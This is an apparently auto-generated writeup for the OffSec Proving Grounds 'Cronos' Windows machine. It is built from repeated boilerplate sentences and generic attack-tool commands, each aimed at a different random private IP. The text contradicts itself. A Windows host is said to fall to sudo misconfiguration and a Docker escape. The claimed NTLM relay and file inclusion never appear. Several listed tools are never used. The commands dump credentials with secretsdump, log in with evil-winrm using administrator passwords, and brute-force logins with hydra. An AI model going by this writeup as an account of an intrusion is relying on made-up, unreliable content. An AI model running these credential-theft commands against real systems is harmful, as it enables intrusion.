---
TitleSEO: "OffSec Proving Grounds — Cronos (Hard Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Cronos (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Cronos. NTLM Relay and Local File Inclusion to achieve hard compromise on Windows."
Keywords: "offsec, hackthebox, hard, ctf"
URL: "https://zurefx.github.io/writeups/htb-cronos-549.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-cronos-549/"
Date: "2025-03-18"
Tags: "OffSec, HackTheBox, Hard, CTF"
Section: "writeups"
Lang: "en"
main_img: "htb-cronos-549"
Permalink: "/writeups/htb-cronos-549.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Cronos** is rated **Hard** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.127.188.44`.

### Objectives

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.88.216.165 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.117.216.21
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

```bash
crackmapexec smb 10.16.27.242 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.121.12.92/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
evil-winrm -i 10.69.97.116 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.49.224.118/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

Key finding: **NTLM Relay**.

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.39.164.254/FUZZ
crackmapexec smb 10.103.23.107 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.146.184 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.90.10.97 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.117.149.161 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.27.246.220/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
gobuster dir -u http://10.43.70.143/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.50.158.88/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.116.96.62
```

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `sqlmap`
- `metasploit`
- `mimikatz`
- `wpscan`
- `crackmapexec`

### Key Takeaways

- NTLM Relay
- Local File Inclusion
- Docker Escape
